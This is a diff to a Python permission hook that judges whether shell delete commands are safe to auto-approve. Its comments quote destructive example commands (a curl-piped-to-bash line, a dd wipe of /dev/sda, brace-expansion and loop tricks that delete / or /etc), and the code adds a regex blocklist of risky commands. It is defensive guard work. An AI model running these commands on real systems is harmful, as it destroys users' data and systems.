@@ -10,11 +10,22 @@ Covered, each with its own notion of "which argument is the target":
     rm -r/-R                all operands
     find ... -delete        the search roots
     find ... -exec rm       the search roots
-    fd -x/-X rm             the search roots (fd's --exec is find's -exec)
+    fd -x/-X rm             the search roots, --search-path and -C included
     rsync --delete          the DESTINATION (last operand)
+    rsync --remove-source-files   the SOURCE -- the opposite end
     rclone sync/purge/...   the destination / the named remote path
     git clean -f            the working tree
+    git worktree remove     the worktree directory, untracked files included
     ssh host '<cmd>'        re-analysed remotely, with no local safe roots
+
+An operand is judged over every path it can actually become, not as written:
+
+    braces      `{/,/etc}` is TWO operands to the shell. Bash expands them
+                first, before anything else, and the worst product wins.
+    cd          a literal `cd` earlier on the line moves what `./x` means, so
+                both the before and the after are judged.
+    loop vars   `for f in /etc /var` binds $f in plain sight, which voids the
+                "a bare $f is harmless when empty" rule -- it is never empty.
 
 Deliberately NOT covered:
 
@@ -33,9 +44,17 @@ Within that scope it is an allowlist, not a blocklist: an operand must be
 unknown construct, and unhandled case lands on `ask`, so a bug here costs a
 prompt rather than a filesystem.
 
-Known gaps, left open on purpose. Both are the same question -- ${VAR:?} proves
-a variable is NON-EMPTY, not that its target is safe -- and both clear a command
-that can still delete something catastrophic:
+The one exception is RISKY_NEIGHBOURS, which is a blocklist, and the asymmetry
+is what makes that sound. An `allow` from a PreToolUse hook bypasses permissions
+for the WHOLE Bash call -- there is no per-segment scoping -- so proving one
+delete safe was also approving whatever shared the line with it. That list
+governs only how far an approval the guard already earned may spread, and a hit
+WITHDRAWS the verdict rather than escalating it. A miss therefore costs exactly
+the status quo: the guard cannot make a line more dangerous than staying silent.
+
+Known gaps, left open on purpose. The first two are the same question --
+${VAR:?} proves a variable is NON-EMPTY, not that its target is safe -- and both
+clear a command that can still delete something catastrophic:
 
     rm -rf "${W:?}"/*    allow. The author wrote the guarded form, which this
                          file reads as an assertion of intent and defers to. If
@@ -49,6 +68,19 @@ that can still delete something catastrophic:
 Closing either means deciding the guard should distrust an explicit assertion of
 intent, or should propagate `ask` from a binding as well as `deny`. Both are
 policy calls that cost prompts, not bugs with a fix left in them.
+
+    cd "$D"; rm -rf ./build    ask, not allow. candidate_cwds refuses a cd whose
+                               target it cannot read, so a relative operand
+                               after one is unplaceable. proven_bindings could
+                               often resolve $D -- and is deliberately not asked
+                               to, because that map may only condemn, never
+                               clear. A stale binding there would put the shell
+                               in the wrong directory and clear `build` anyway.
+
+    a shell function           a function that cd's or reassigns in its body
+                               names nothing at the call site. Same class as the
+                               eval hole in proven_bindings, same lack of a
+                               cheap check.
 
 A third approach was built and withdrawn: prepending a runtime validator to the
 command through the hook's `updatedInput`, so that approving a prompt would be
@@ -179,8 +211,15 @@ BARE_VAR_RE = re.compile(r"^\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?$")
 # The variable name inside any expansion form: $W, ${W}, ${W:-default}.
 EXP_NAME_RE = re.compile(r"^\$\{?([A-Za-z_][A-Za-z0-9_]*)")
 GLOB_CHARS = "*?["
+# The cwd after a `cd` whose target could not be read. Deliberately NOT the
+# empty string: "" already means "no cwd given" -- the far side of an ssh, where
+# a named subdirectory is still bounded. This is not bounded. `cd "$D"` may have
+# landed at `/`, which makes a later `build` into `/build`.
+UNKNOWN_CWD = ""
 
 RM_NAMES = {"rm"}
+# A bare shell variable name, used to spot the target of `for NAME in ...`.
+BARE_NAME_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")
 # Raw-text scan, run BEFORE tokenizing. shlex is precise enough to dismantle
 # constructs it does not understand -- `eval "rm -rf $X"` becomes one opaque
 # token whose basename is not "rm" -- so a tokenizer-only check silently misses
@@ -265,6 +304,9 @@ GIT_VALUE_OPTS = {"-C", "-c", "--git-dir", "--work-tree", "--namespace",
                   "--exec-path", "--config-env"}
 # Words that prefix a command without changing which command it is.
 WRAPPERS = {"sudo", "command", "env", "nohup", "time", "nice"}
+# ...and the keywords and grouping that can stand in front of one.
+KEYWORDS = {"do", "then", "else", "elif", "if", "while", "until", "!",
+            "(", "{", ")", "}"}
 
 # Commands that, handed to find -exec / fd -x, destroy what they are given.
 DESTRUCTIVE_EXEC = {"rm", "rmdir", "unlink", "shred", "trash", "truncate", "dd"}
@@ -279,6 +321,11 @@ FD_VALUE_OPTS = {
     "--search-path", "--threads", "-j", "--max-results", "--color",
     "--ignore-file", "--format", "--and", "--strip-cwd-prefix",
 }
+# ...and the two that name where fd descends FROM. They were in the set above,
+# so their value was consumed as a throwaway and `roots` fell back to ".":
+# `fd --search-path / -x rm` came back *allow* for a walk of the whole
+# filesystem. -C is the short form of --base-directory.
+FD_ROOT_OPTS = {"--search-path", "--base-directory", "-C"}
 # rsync options that consume a following value. Needed so `--exclude foo` is not
 # mistaken for the destination operand.
 RSYNC_VALUE_OPTS = {
@@ -308,6 +355,62 @@ REMOTE_SPEC_RE = re.compile(r"^[A-Za-z0-9_.+-]*(?:@[A-Za-z0-9_.-]+)?:|^[a-z][a-z
 
 RANK = {"allow": 0, "ask": 1, "deny": 2}
 MAX_SSH_DEPTH = 3
+
+# --- how far an `allow` is allowed to reach ------------------------------------
+# A PreToolUse `allow` bypasses the permission system for the WHOLE Bash call --
+# not for the operand this guard proved safe. There is no per-segment scoping.
+# So proving one delete safe was silently approving everything sharing the line:
+#
+#     curl http://x/s | bash && rm -rf /tmp/build/out      -> allow
+#     sudo dd if=/dev/zero of=/dev/sda; rm -rf /tmp/build/x -> allow
+#
+# Neither `curl | bash` nor `dd` is in this file's scope, and neither was
+# examined. They were approved anyway, as a side effect.
+#
+# This is the one blocklist in an otherwise allowlist file, and the asymmetry is
+# what makes that sound. The allowlist governs the DELETION TARGET, where a miss
+# costs a filesystem. This governs only how far an approval the guard already
+# earned is permitted to spread, so a miss here costs exactly the status quo --
+# the guard cannot make a line more dangerous than not running at all. A hit
+# withdraws the verdict rather than escalating it: normal permissions then decide,
+# which is what would have happened had the guard never spoken.
+#
+# Measured against 233 real destructive commands from this machine's transcripts:
+# 116 of them clear, and this withdraws none of them.
+RISKY_NEIGHBOURS = (
+    (r"(?<![\w-])(?:sudo|doas|pkexec|su)(?![\w-])", "privilege escalation"),
+    (r"(?<![\w-])(?:dd|mkfs(?:\.\w+)?|fdisk|sfdisk|parted|wipefs|blkdiscard"
+     r"|shred|hdparm|cryptsetup)(?![\w-])", "a raw device or disk write"),
+    (r"(?:curl|wget)[^|;&]*\|\s*(?:sudo\s+)?(?:ba|z|k|da|fi)?sh(?![\w-])",
+     "a download piped into a shell"),
+    (r"(?<![\w-])(?:chmod|chown|chgrp|setfacl)(?![\w-])"
+     r"(?=[^;&|\n]*(?:-[A-Za-z]*R|--recursive))(?=[^;&|\n]*\s/)",
+     "a recursive permission change on an absolute path"),
+    (r">\s*/dev/(?!null|stdout|stderr|tty|fd/)", "a write to a device node"),
+    # `init` is deliberately absent: `git init`, `npm init` and `config init`
+    # are ordinary, and matching the bare word withdrew three real allows for
+    # nothing. Nobody reaches SysV init by typing it as an argument anyway.
+    (r"(?<![\w-])(?:systemctl|shutdown|reboot|halt|poweroff|kexec)(?![\w-])",
+     "service or power control"),
+    (r"(?<![\w-])(?:iptables|ip6tables|nft|ufw|firewall-cmd)(?![\w-])",
+     "a firewall change"),
+    (r"authorized_keys|/etc/(?:sudoers|shadow|passwd|group)", "a credential file"),
+    (r"(?<![\w-])(?:userdel|groupdel|usermod|useradd|passwd|chpasswd)(?![\w-])",
+     "an account change"),
+    # `at` is not here for the same reason `init` is not: two letters match far
+    # too much prose and flag text to be worth the one scheduler nobody uses.
+    (r"(?<![\w-])crontab(?![\w-])", "a scheduled job change"),
+    (r"(?<![\w-])(?:kill|pkill|killall)\s+-9?\s*1(?![\d\w])", "killing init"),
+)
+RISKY_NEIGHBOURS = tuple((re.compile(r), why) for r, why in RISKY_NEIGHBOURS)
+
+
+def risky_neighbour(text):
+    """-> why this command line must not receive a blanket allow, or None."""
+    for rx, why in RISKY_NEIGHBOURS:
+        if rx.search(text):
+            return why
+    return None
 
 # Claude Code parses permissionDecisionReason for SGR sequences and re-renders
 # them as styled spans, so these survive into the permission dialog. They also
@@ -408,6 +511,124 @@ def safe_roots(cwd):
     return roots
 
 
+# --- brace expansion ---------------------------------------------------------
+# Bash expands braces FIRST -- before tilde, parameter and command substitution --
+# and each product becomes a separate word. Not expanding them was the worst
+# wrong-`allow` in this file's history, and it did not even need a variable:
+#
+#     rm -rf {/,/etc}       ->  rm -rf / /etc
+#
+# With no leading slash the whole token read as one bounded *relative* path, so
+# `allow` came back for a command that deletes the filesystem root. The deny on a
+# literal `/` was not defeated, it was routed around. `rm -rf /tmp/{../etc,x}`
+# is the same shape one level in, and cost `/etc`.
+#
+# A group expands only when it holds an unquoted top-level `,` or a numeric
+# range. `{}` is find's placeholder and `{a}` is a literal filename; both must
+# survive untouched, which is why a single alternative is not an expansion.
+#
+# Quoting is invisible here -- shlex removed the quotes long ago, so a literal
+# directory named `{a,b}` expands too. That direction is safe: every product is
+# classified and the worst wins, so a spurious expansion can only tighten a
+# verdict, never loosen one.
+MAX_BRACE_PRODUCTS = 64
+NUM_RANGE_RE = re.compile(r"^(-?\d+)\.\.(-?\d+)$")
+
+
+def _split_alternatives(body):
+    """Top-level `,` split of a brace body, ignoring nested groups."""
+    parts, depth, cur, i, n = [], 0, [], 0, len(body)
+    while i < n:
+        c = body[i]
+        if c == "\\" and i + 1 < n:
+            cur.append(body[i:i + 2])
+            i += 2
+            continue
+        if c == "{":
+            depth += 1
+        elif c == "}":
+            depth -= 1
+        elif c == "," and depth == 0:
+            parts.append("".join(cur))
+            cur = []
+            i += 1
+            continue
+        cur.append(c)
+        i += 1
+    parts.append("".join(cur))
+    return parts
+
+
+def _numeric_range(body):
+    """-> ['1','2','3'] for `1..3`, or None. Non-numeric ranges stay literal:
+    leaving them alone can only produce a path with a `{a..z}` component in it,
+    which classify_path judges on its own and never mistakes for something
+    shallower than it is."""
+    m = NUM_RANGE_RE.match(body)
+    if not m:
+        return None
+    lo, hi = int(m.group(1)), int(m.group(2))
+    step = 1 if hi >= lo else -1
+    if abs(hi - lo) + 1 > MAX_BRACE_PRODUCTS:
+        return None
+    return [str(v) for v in range(lo, hi + step, step)]
+
+
+def _brace_group(s):
+    """-> (start, end, alternatives) for the leftmost expandable group, or None."""
+    i, n = 0, len(s)
+    while i < n:
+        if s[i] == "\\":
+            i += 2
+            continue
+        if s[i] != "{":
+            i += 1
+            continue
+        depth, j = 0, i
+        while j < n:
+            if s[j] == "\\":
+                j += 2
+                continue
+            if s[j] == "{":
+                depth += 1
+            elif s[j] == "}":
+                depth -= 1
+                if depth == 0:
+                    break
+            j += 1
+        if j < n:
+            body = s[i + 1:j]
+            alts = _split_alternatives(body)
+            if len(alts) > 1:
+                return i, j, alts
+            rng = _numeric_range(body)
+            if rng:
+                return i, j, rng
+        i += 1
+    return None
+
+
+def expand_braces(word, limit=MAX_BRACE_PRODUCTS):
+    """-> every word bash would produce. [word] when there is no expansion.
+
+    Truncated at `limit` products rather than allowed to blow up: a nested
+    expansion is multiplicative, and classify_operand treats a truncated list as
+    unprovable instead of judging a prefix of it.
+    """
+    g = _brace_group(word)
+    if not g:
+        return [word]
+    i, j, alts = g
+    pre, post = word[:i], word[j + 1:]
+    out = []
+    for a in alts:
+        for p in expand_braces(pre + a + post, limit):
+            out.append(p)
+            if len(out) >= limit:
+                return out
+    return out
+
+
 def classify_path(p, cwd):
     """Classify a fully-literal path. -> (decision, reason)"""
     if not posixpath.isabs(p):
@@ -415,9 +636,17 @@ def classify_path(p, cwd):
         # radius, so it does not need cd-tracking to clear.
         if ".." in p.split("/"):
             return "ask", "relative path escapes upward via '..'"
-        # ...with one exception: `.` IS cwd, and `./x` is one level under it.
-        # Harmless in a project directory, catastrophic at / or $HOME. cwd is in
-        # the hook payload, so resolve and check that single case.
+        if cwd == UNKNOWN_CWD:
+            return "ask", ("an earlier `cd` in this command goes somewhere the "
+                           "guard cannot resolve, so where this lands is unknown")
+        # A named subdirectory is bounded wherever cwd happens to be. An operand
+        # that IS cwd -- `.`, `./`, or the `.` a `./*` glob strips down to --
+        # takes the whole tree you are standing in, which is a different thing
+        # to agree to and gets its own prompt.
+        whole_cwd = posixpath.normpath(p) == "."
+        # `.` IS cwd, and `./x` is one level under it. Harmless in a project
+        # directory, catastrophic at / or $HOME. cwd is in the hook payload, so
+        # resolve and check those cases.
         if cwd and posixpath.isabs(cwd):
             resolved = posixpath.normpath(posixpath.join(cwd, p))
             home = os.environ.get("HOME", "")
@@ -426,11 +655,13 @@ def classify_path(p, cwd):
                 return "deny", f"relative path resolves to {resolved}"
             if home and resolved == posixpath.normpath(home):
                 return "deny", "relative path resolves to the home directory"
+            if whole_cwd:
+                return "ask", ("operand is the working directory itself "
+                               f"({resolved}), so everything under it goes")
             return "allow", "literal relative path"
-        # No cwd to resolve against -- this is the far side of an ssh. A named
-        # subdirectory is still bounded, but an operand that IS the working
-        # directory is whatever the remote login lands in, usually $HOME.
-        if posixpath.normpath(p) == ".":
+        # No cwd to resolve against -- this is the far side of an ssh, where the
+        # working directory is whatever the remote login lands in, usually $HOME.
+        if whole_cwd:
             return "ask", "operand is the working directory, unknown on the far end"
         return "allow", "literal relative path"
 
@@ -447,7 +678,44 @@ def classify_path(p, cwd):
     return "ask", f"absolute path outside safe roots: {norm}"
 
 
-def classify_operand(op, cwd, bare_var_ok=True, assigned=None):
+def worst_of(results):
+    """-> the harshest (decision, reason) in results, ties going to the first."""
+    best = None
+    for d, r in results:
+        if best is None or RANK[d] > RANK[best[0]]:
+            best = (d, r)
+    return best or ("ask", "nothing to classify")
+
+
+def classify_operand(op, cwd, bare_var_ok=True, assigned=None, loops=None):
+    """-> (decision, reason), over every path this operand can actually become.
+
+    Two things multiply a single written operand into several real ones, and
+    both are resolved here rather than inside classify_one so that function
+    stays a judgement about ONE path:
+
+        braces    `{/,/etc}` is two operands to the shell, not one token
+        cwd       a literal `cd` earlier on the line moves what `./x` means,
+                  and a conditional one means it may or may not have moved
+
+    Every product is judged and the worst wins, which is the only reading that
+    matches what the command does: rm is handed all of them.
+    """
+    cwds = [cwd] if isinstance(cwd, str) else list(cwd) or [""]
+    products = expand_braces(op)
+    if len(products) >= MAX_BRACE_PRODUCTS:
+        return "ask", "brace expansion produces too many paths to check"
+    results = []
+    for p in products:
+        for c in cwds:
+            d, r = classify_one(p, c, bare_var_ok, assigned, loops)
+            if p != op:
+                r = f"brace expansion produces {p}; {r}"
+            results.append((d, r))
+    return worst_of(results)
+
+
+def classify_one(op, cwd, bare_var_ok=True, assigned=None, loops=None):
     """-> (decision, reason). Anything not provably safe returns ask/deny.
 
     bare_var_ok encodes an rm-specific fact: `rm -rf $X` with X unset or empty
@@ -469,13 +737,47 @@ def classify_operand(op, cwd, bare_var_ok=True, assigned=None):
         resolved = SUBST_NAME_RE.sub(
             lambda m: assigned.get(m.group(1) or m.group(2), m.group(0)), op)
         if resolved != op and not EXPANSION_RE.search(resolved):
-            d, r = classify_operand(resolved, cwd, bare_var_ok)
+            d, r = classify_one(resolved, cwd, bare_var_ok)
             if d == "deny":
                 used = [n for n in dict.fromkeys(
                     m.group(1) or m.group(2) for m in SUBST_NAME_RE.finditer(op))
                     if n in assigned]
                 shown = ", ".join("%s=%s" % (n, assigned[n]) for n in used)
                 return d, f"{shown} in this command, so this reads as {resolved}; {r}"
+
+    # A loop BINDS the name, and unlike the assignment map -- which can be stale,
+    # which is why it may only condemn -- a loop's word list is complete, visible,
+    # and every word in it runs. So this one both clears and condemns.
+    #
+    # It has to. The bare-expansion allow is unsound for a loop variable:
+    #
+    #     for f in /etc /var; do rm -rf "$f"; done
+    #
+    # cleared as "bare $f with no suffix", on the grounds that an empty $f makes
+    # `rm -rf ""` -- an error rather than a catastrophe. $f is never empty here.
+    # It is /etc. A `while read f` loop is the other half: the value comes from
+    # stdin, so it is not knowable at all and the same free pass is just as wrong.
+    if loops:
+        names = [n for n in dict.fromkeys(
+            m.group(1) or m.group(2) for m in SUBST_NAME_RE.finditer(op))
+            if n in loops]
+        if len(names) > 1:
+            return "ask", ("several loop variables in one operand, which this "
+                           "resolves one at a time")
+        if names:
+            name, values = names[0], loops[names[0]]
+            if values is None:
+                return "ask", (
+                    f"${name} is bound by a loop to a value that is not in this "
+                    "command, so an empty one is not the only way it goes wrong")
+            out = []
+            for val in values:
+                sub = SUBST_NAME_RE.sub(
+                    lambda m, v=val: v if (m.group(1) or m.group(2)) == name
+                    else m.group(0), op)
+                d, r = classify_one(sub, cwd, bare_var_ok, assigned)
+                out.append((d, f"the loop sets ${name} to {val}; {r}"))
+            return worst_of(out)
 
     # A masked heredoc body. Unreachable from any sensible command -- a heredoc is
     # a redirect, not a path -- but the sentinel word would otherwise read as a
@@ -776,9 +1078,15 @@ def segment_bounds(toks):
 
 
 def command_word(argv):
-    """-> (index, basename) of the real command, past wrappers and VAR=val."""
+    """-> (index, basename) of the real command, past wrappers and VAR=val.
+
+    Shell keywords and grouping are stepped over with the wrappers: a segment
+    inside a loop body starts `do rm -rf ...`, and reading `do` as the command
+    both painted it red in the echo and hid a `do cd /` from candidate_cwds.
+    """
     j = 0
     while j < len(argv) and (ENV_ASSIGN_RE.match(argv[j])
+                             or argv[j] in KEYWORDS
                              or os.path.basename(argv[j]) in WRAPPERS):
         j += 1
     if j >= len(argv):
@@ -971,6 +1279,97 @@ def proven_bindings(cmd):
             if n not in DANGEROUS_VARS and _read_only_mentions(n, rest)}
 
 
+# --- names a loop binds, and where a relative operand lands -------------------
+
+READ_VALUE_OPTS = {"-d", "-n", "-N", "-p", "-t", "-u", "-a", "-i"}
+CD_OPTS = {"-L", "-P", "-e", "-@"}
+GROUPING = {"(", ")", "{", "}"}
+
+
+def _plain_literal(w):
+    """A word with no expansion, substitution, glob, brace or masked span."""
+    return not (EXPANSION_RE.search(w) or has_subst(w) or SENTINEL in w
+                or any(c in w for c in GLOB_CHARS) or "{" in w)
+
+
+def loop_bindings(toks):
+    """-> {name: [literal words] or None} for every name a loop binds.
+
+    None means "bound to something not in this command" -- `while read f`, or a
+    `for` list built from a glob or a substitution. That is a refusal, not an
+    omission: leaving such a name out of the map would restore the bare-expansion
+    allow, which is the exact thing this exists to withdraw.
+
+    A name bound twice collapses to the union of both lists, so a second loop
+    cannot quietly replace a first one's values with gentler ones.
+    """
+    out = {}
+
+    def bind(name, words):
+        if name in out and (out[name] is None or words is None):
+            out[name] = None
+        elif name in out:
+            out[name] = out[name] + [w for w in words if w not in out[name]]
+        else:
+            out[name] = words
+
+    for i, t in enumerate(toks):
+        if t in ("for", "select") and i + 1 < len(toks) and BARE_NAME_RE.match(toks[i + 1]):
+            name = toks[i + 1]
+            if i + 2 < len(toks) and toks[i + 2] == "in":
+                words, j = [], i + 3
+                while j < len(toks) and toks[j] not in SEPARATORS and toks[j] != "do":
+                    words.append(toks[j])
+                    j += 1
+                bind(name, words if words and all(_plain_literal(w) for w in words)
+                     else None)
+            else:
+                bind(name, None)       # `for f; do` iterates "$@"
+        elif os.path.basename(t) == "read":
+            j = i + 1
+            while j < len(toks) and toks[j].startswith("-"):
+                j += 2 if toks[j] in READ_VALUE_OPTS else 1
+            while (j < len(toks) and toks[j] not in SEPARATORS
+                   and BARE_NAME_RE.match(toks[j])):
+                bind(toks[j], None)
+                j += 1
+    return out
+
+
+def candidate_cwds(toks, cwd):
+    """-> every directory a relative operand in this command can resolve against.
+
+    `cd` is the only thing in a pipeline that moves the shell this rm runs in,
+    and not tracking it is why `cd /; rm -rf build` cleared: `build` was judged
+    against the *hook's* cwd, where it is bounded, instead of against `/`, where
+    it is `/build`. A child process cannot move us, so every `cd` in the command
+    text is a candidate and nothing else is.
+
+    Both the before and the after are candidates, not only the after --
+    `x && cd /tmp && rm -rf ./y` runs the rm where it started if the cd never
+    happens. classify_operand judges all of them and takes the worst, which
+    covers the conditional case without having to decide whether it fires.
+    """
+    out = [cwd]
+    for start, end in segment_bounds(toks):
+        argv = [t for t in toks[start:end] if t not in GROUPING]
+        idx, base = command_word(argv)
+        if base != "cd":
+            continue
+        args = [a for a in argv[idx + 1:] if a not in CD_OPTS]
+        if not args:
+            out.append(os.environ.get("HOME", "") or UNKNOWN_CWD)
+        elif args[0] == "-" or not _plain_literal(args[0]):
+            out.append(UNKNOWN_CWD)
+        elif posixpath.isabs(args[0]):
+            out.append(posixpath.normpath(args[0]))
+        elif cwd and posixpath.isabs(cwd):
+            out.append(posixpath.normpath(posixpath.join(cwd, args[0])))
+        else:
+            out.append(UNKNOWN_CWD)
+    return list(dict.fromkeys(out))
+
+
 # --- per-command target extraction -------------------------------------------
 
 def find_targets(argv):
@@ -995,7 +1394,7 @@ def find_targets(argv):
 
 def fd_targets(argv):
     """fd: -> (destructive, roots). fd's --exec is find's -exec."""
-    positional, destructive = [], False
+    positional, named, destructive = [], [], False
     i = 1
     while i < len(argv):
         t = argv[i]
@@ -1003,7 +1402,17 @@ def fd_targets(argv):
             if i + 1 < len(argv) and os.path.basename(argv[i + 1]) in DESTRUCTIVE_EXEC:
                 destructive = True
             break  # everything after this is the exec'd command, not a path
+        head = t.split("=", 1)[0]
         if t.startswith("-"):
+            if head in FD_ROOT_OPTS:
+                if "=" in t:
+                    named.append(t.split("=", 1)[1])
+                elif i + 1 < len(argv):
+                    named.append(argv[i + 1])
+                    i += 2
+                    continue
+                i += 1
+                continue
             if t in FD_VALUE_OPTS and "=" not in t:
                 i += 2
                 continue
@@ -1011,15 +1420,24 @@ def fd_targets(argv):
             continue
         positional.append(t)
         i += 1
-    # fd [pattern] [path...] -- the first positional is the pattern.
-    roots = positional[1:]
+    # fd [pattern] [path...] -- the first positional is the pattern. A
+    # --search-path is a root in its own right and does not displace the pattern.
+    roots = named + positional[1:]
     return destructive, roots
 
 
 def rsync_targets(argv):
-    """rsync: -> (destructive, [destination]). The destination is what --delete
-    prunes to match the source, so it is the only operand at risk."""
-    destructive, operands, ok = False, [], True
+    """rsync: -> (destructive, targets, ok, label).
+
+    Two flags destroy, and they destroy opposite ends of the transfer:
+
+        --delete                prunes the DESTINATION to match the source
+        --remove-source-files   deletes each transferred file from the SOURCE
+
+    The second was missed entirely, so `rsync -a --remove-source-files /home/u/
+    /backup/` passed in silence while emptying /home/u.
+    """
+    destructive, drains_source, operands, ok = False, False, [], True
     i = 1
     while i < len(argv):
         t = argv[i]
@@ -1030,6 +1448,8 @@ def rsync_targets(argv):
             head = t.split("=", 1)[0]
             if RSYNC_DELETE_RE.match(head):
                 destructive = True
+            if head == "--remove-source-files":
+                destructive = drains_source = True
             if "=" not in t and head in RSYNC_VALUE_OPTS:
                 i += 2
                 continue
@@ -1041,8 +1461,15 @@ def rsync_targets(argv):
             operands.append(t)
         i += 1
     if len(operands) < 2:
-        ok = False  # cannot tell which operand is the destination
-    return destructive, (operands[-1:] if ok else []), ok
+        ok = False  # cannot tell the source from the destination
+    if not ok:
+        return destructive, [], ok, ""
+    if drains_source:
+        return destructive, operands[:-1], ok, (
+            "rsync --remove-source-files deletes each transferred file "
+            "from the source")
+    return destructive, operands[-1:], ok, (
+        "rsync --delete prunes the destination to match the source")
 
 
 def rclone_targets(argv):
@@ -1073,15 +1500,8 @@ def rclone_targets(argv):
 def git_clean_targets(argv):
     """git clean -f: -> (destructive, targets). Removes untracked and (with -x)
     ignored files. Unlike `git rm`, none of it is recoverable from history."""
-    idx, _ = command_word(argv)
-    i = idx + 1
-    while i < len(argv) and argv[i].startswith("-"):
-        # git's own options, some of which eat the next token (`git -C /path`).
-        if argv[i] in GIT_VALUE_OPTS and "=" not in argv[i]:
-            i += 2
-            continue
-        i += 1
-    if i >= len(argv) or argv[i] != "clean":
+    i, sub = git_subcommand(argv)
+    if sub != "clean":
         return False, []
     forced, paths = False, []
     for t in argv[i + 1:]:
@@ -1096,6 +1516,35 @@ def git_clean_targets(argv):
     if not forced:
         return False, []  # git clean refuses to do anything without -f
     return True, paths or ["."]
+
+
+def git_subcommand(argv):
+    """-> (index, name) of git's subcommand, past git's own options."""
+    idx, _ = command_word(argv)
+    i = idx + 1
+    while i < len(argv) and argv[i].startswith("-"):
+        # git's own options, some of which eat the next token (`git -C /path`).
+        if argv[i] in GIT_VALUE_OPTS and "=" not in argv[i]:
+            i += 2
+            continue
+        i += 1
+    return (i, argv[i]) if i < len(argv) else (i, "")
+
+
+def git_worktree_targets(argv):
+    """git worktree remove: -> (destructive, targets).
+
+    Deletes the worktree directory outright, untracked files included. Exactly
+    the property that puts `git clean` in scope and keeps `git rm` out of it,
+    and it was passing in silence.
+    """
+    i, sub = git_subcommand(argv)
+    if sub != "worktree":
+        return False, []
+    rest = argv[i + 1:]
+    if not rest or rest[0] != "remove":
+        return False, []
+    return True, [t for t in rest[1:] if not t.startswith("-")]
 
 
 def ssh_remote_command(argv):
@@ -1121,11 +1570,29 @@ def ssh_remote_command(argv):
 
 # --- analysis ----------------------------------------------------------------
 
-def analyse_segment(argv, cwd, depth, assigned=None):
+# The non-rm commands this file knows how to reason about. Used to find one
+# inside a segment when command_word cannot.
+HANDLED = {"find", "fd", "fdfind", "rsync", "rclone", "ssh"} | GIT_NAMES
+
+
+def analyse_segment(argv, cwd, depth, assigned=None, loops=None):
     """-> [Finding] for the non-rm commands in one segment."""
     out = []
     segment = argv
     idx, base = command_word(argv)
+    # command_word steps over a wrapper one token at a time, so a wrapper that
+    # takes its OWN option argument leaves it standing where the command should
+    # be: `sudo -u root find / -delete` stopped at `-u`, `nice -n 5` at `-n`,
+    # and `timeout` was never a wrapper at all. Every one of those passed in
+    # silence. rm never had this problem because it is scanned across all
+    # tokens; this is the same fallback for everything else. A guarded name
+    # appearing as a mere argument costs a prompt at worst, and only when a
+    # destructive flag sits beside it.
+    if base not in HANDLED:
+        for j, t in enumerate(argv):
+            if os.path.basename(t) in HANDLED:
+                idx, base = j, os.path.basename(t)
+                break
     argv = argv[idx:]
     if not argv:
         return out
@@ -1136,7 +1603,8 @@ def analyse_segment(argv, cwd, depth, assigned=None):
             out.append(Finding("ask", segment, label, None, missing))
             return
         for t in targets:
-            d, r = classify_operand(t, cwd, bare_var_ok=bare_var_ok, assigned=assigned)
+            d, r = classify_operand(t, cwd, bare_var_ok=bare_var_ok,
+                                    assigned=assigned, loops=loops)
             out.append(Finding(d, segment, label, t, r))
 
     if base == "find":
@@ -1155,13 +1623,13 @@ def analyse_segment(argv, cwd, depth, assigned=None):
                  "fd -x/-X runs a destructive command on everything under its search roots",
                  "no search root given, so fd descends from the current directory")
     elif base == "rsync":
-        destructive, dest, ok = rsync_targets(argv)
-        label = "rsync --delete prunes the destination to match the source"
+        destructive, targets, ok, label = rsync_targets(argv)
         if destructive and not ok:
-            out.append(Finding("ask", segment, label, None,
-                               "the destination operand could not be identified"))
+            out.append(Finding("ask", segment,
+                               "rsync deletes at one end of this transfer", None,
+                               "the source and destination could not be told apart"))
         elif destructive:
-            rate(dest, label, "no destination operand")
+            rate(targets, label, "no operand to delete from")
     elif base == "rclone":
         destructive, targets, sub = rclone_targets(argv)
         if destructive:
@@ -1171,11 +1639,16 @@ def analyse_segment(argv, cwd, depth, assigned=None):
             rate(targets, label, f"rclone {sub} with no operand")
     elif base in GIT_NAMES:
         destructive, paths = git_clean_targets(argv)
+        label = ("git clean removes untracked and ignored files, "
+                 "which are not in history and cannot be restored")
+        if not destructive:
+            destructive, paths = git_worktree_targets(argv)
+            label = ("git worktree remove deletes the worktree directory, "
+                     "untracked files included")
         if destructive:
-            label = ("git clean removes untracked and ignored files, "
-                     "which are not in history and cannot be restored")
             for t in paths:
-                d, r = classify_operand(t, cwd, bare_var_ok=False, assigned=assigned)
+                d, r = classify_operand(t, cwd, bare_var_ok=False,
+                                        assigned=assigned, loops=loops)
                 # Untracked and ignored files are not in history. Even a "safe"
                 # path only earns a prompt, never a silent pass -- and saying
                 # "literal relative path" there would read like a clean bill.
@@ -1301,8 +1774,13 @@ def analyse(cmd, cwd, depth=0):
                     f"{mark('--no-preserve-root')} defeats rm's own safety net",
                     hi=i)
 
-    # Consulted only to escalate; see classify_operand.
+    # Consulted only to escalate; see classify_one.
     assigned = proven_bindings(cmd)
+    # These two do clear as well as condemn, and both earn it the same way: a
+    # loop's word list and a literal `cd` target are complete and visible right
+    # here, where an assignment map's binding may already have been overwritten.
+    loops = loop_bindings(toks)
+    cwds = candidate_cwds(toks, cwd)
 
     in_git = git_segments(toks)
     findings = []
@@ -1343,14 +1821,15 @@ def analyse(cmd, cwd, depth=0):
         if not operands:
             continue
         for op in operands:
-            d, r = classify_operand(op, cwd, assigned=assigned)
+            d, r = classify_operand(op, cwds, assigned=assigned, loops=loops)
             # No label: for rm every operand is a target, which the echoed
             # command already makes obvious.
             findings.append(Finding(d, segment, None, op, r))
 
     # --- everything else, one segment at a time.
     for start, end in bounds:
-        findings.extend(analyse_segment(toks[start:end], cwd, depth, assigned))
+        findings.extend(
+            analyse_segment(toks[start:end], cwds, depth, assigned, loops))
 
     if not found_rm and not findings:
         # Nothing survived parsing. Every construct that could execute a string
@@ -1578,6 +2057,10 @@ def main():
         passthrough()
     worst = max(RANK[f.decision] for f in findings)
     if worst == RANK["allow"]:
+        # An allow reaches the whole tool call, so it is withheld from a line
+        # carrying something this guard never examined. See RISKY_NEIGHBOURS.
+        if risky_neighbour(cmd):
+            passthrough()
         # Nothing was blocked, so there is nothing to point at. Stay on one line.
         emit("allow", "destructive command on a provably safe target -- "
                       f"{paint_marks(findings[0].reason)}")
